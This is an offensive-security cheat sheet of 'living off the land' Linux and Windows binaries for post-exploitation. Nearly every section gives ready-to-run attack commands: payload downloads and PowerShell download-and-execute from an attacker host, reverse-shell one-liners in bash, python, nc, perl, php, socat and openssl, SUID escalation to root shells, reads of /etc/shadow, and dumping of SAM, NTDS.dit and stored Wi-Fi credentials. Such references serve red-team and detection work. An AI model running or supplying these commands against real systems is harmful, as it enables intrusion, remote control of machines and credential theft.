# Living Off The Land Binaries Reference

Legitimate system binaries that can be repurposed for offensive operations. These are useful during post-exploitation when you cannot install additional tools.

> Reference: https://lolbas-project.github.io (Windows) and https://gtfobins.github.io (Linux)

## Linux LOTL Binaries

### File Transfer

| Binary | Command | Notes |
|--------|---------|-------|
| curl | `curl http://attacker/file -o /tmp/file` | Most common |
| wget | `wget http://attacker/file -O /tmp/file` | Alternative |
| python3 | `python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker/file','/tmp/file')"` | No external deps |
| nc | `nc attacker 4444 > /tmp/file` | Raw TCP |
| bash | `bash -c 'cat < /dev/tcp/attacker/4444 > /tmp/file'` | Bash built-in |
| openssl | `openssl s_client -connect attacker:4444 < /dev/null > /tmp/file` | Encrypted |
| scp | `scp user@attacker:/path/file /tmp/file` | SSH-based |
| base64 | Copy base64-encoded content, then `base64 -d > file` | Manual transfer |

### Reverse Shells

| Binary | Command |
|--------|---------|
| bash | `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1` |
| python3 | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| nc | `nc -e /bin/sh ATTACKER PORT` or `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc ATTACKER PORT >/tmp/f` |
| perl | `perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` |
| php | `php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| socat | `socat TCP:ATTACKER:PORT EXEC:/bin/sh,pty,stderr,setsid,sigint,sane` |
| openssl | `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 \| openssl s_client -quiet -connect ATTACKER:PORT > /tmp/s; rm /tmp/s` |

### Privilege Escalation Helpers

| Binary | SUID Abuse |
|--------|------------|
| find | `find . -exec /bin/sh -p \;` |
| vim | `vim -c ':!/bin/sh'` |
| python3 | `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| awk | `awk 'BEGIN {system("/bin/sh")}'` |
| nmap | `nmap --interactive` then `!sh` (old versions) |
| env | `env /bin/sh -p` |
| cp | Copy `/bin/sh` to writable dir, set SUID |

### File Read (Bypassing Restrictions)

| Binary | Command |
|--------|---------|
| base64 | `base64 /etc/shadow \| base64 -d` |
| xxd | `xxd /etc/shadow \| xxd -r` |
| strings | `strings /etc/shadow` |
| od | `od -A n -t c /etc/shadow` |
| diff | `diff /etc/shadow /dev/null` |
| curl | `curl file:///etc/shadow` |

## Windows LOTL Binaries

### Execution

| Binary | Purpose | Example |
|--------|---------|---------|
| certutil | Download & decode files | `certutil -urlcache -split -f http://attacker/payload.exe payload.exe` |
| mshta | Execute HTA payloads | `mshta http://attacker/payload.hta` |
| rundll32 | Execute DLL functions | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"` |
| regsvr32 | Execute scriptlets | `regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll` |
| wmic | Process execution | `wmic process call create "cmd /c whoami"` |
| powershell | Script execution | `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/ps.ps1')"` |
| bitsadmin | File download | `bitsadmin /transfer job http://attacker/file C:\temp\file` |
| msiexec | MSI payload execution | `msiexec /q /i http://attacker/payload.msi` |

### Credential Access

| Binary | Purpose |
|--------|---------|
| reg | `reg save HKLM\SAM sam.bak` — dump SAM hive |
| vssadmin | `vssadmin create shadow /for=C:` — shadow copy for NTDS.dit |
| ntdsutil | `ntdsutil "ac i ntds" "ifm" "create full C:\temp"` — NTDS.dit extraction |
| cmdkey | `cmdkey /list` — list stored credentials |

### Reconnaissance

| Binary | Purpose |
|--------|---------|
| nltest | `nltest /dclist:domain` — enumerate domain controllers |
| netsh | `netsh wlan show profiles` — saved WiFi credentials |
| dsquery | `dsquery user -limit 0` — enumerate AD users |
| qwinsta | `qwinsta /server:HOST` — enumerate sessions |
| tasklist | `tasklist /v /s HOST` — remote process listing |

## GTFOBins Quick Reference

For the complete and updated list of Unix binaries with exploitable features:
- **Shell escape:** Binary drops you into a shell
- **File read:** Binary can read arbitrary files
- **File write:** Binary can write arbitrary files
- **SUID abuse:** Binary retains elevated privileges when SUID
- **Sudo abuse:** Binary can escalate via sudo misconfigurations
- **Capabilities:** Binary exploits Linux capabilities

Always check https://gtfobins.github.io for the latest techniques.
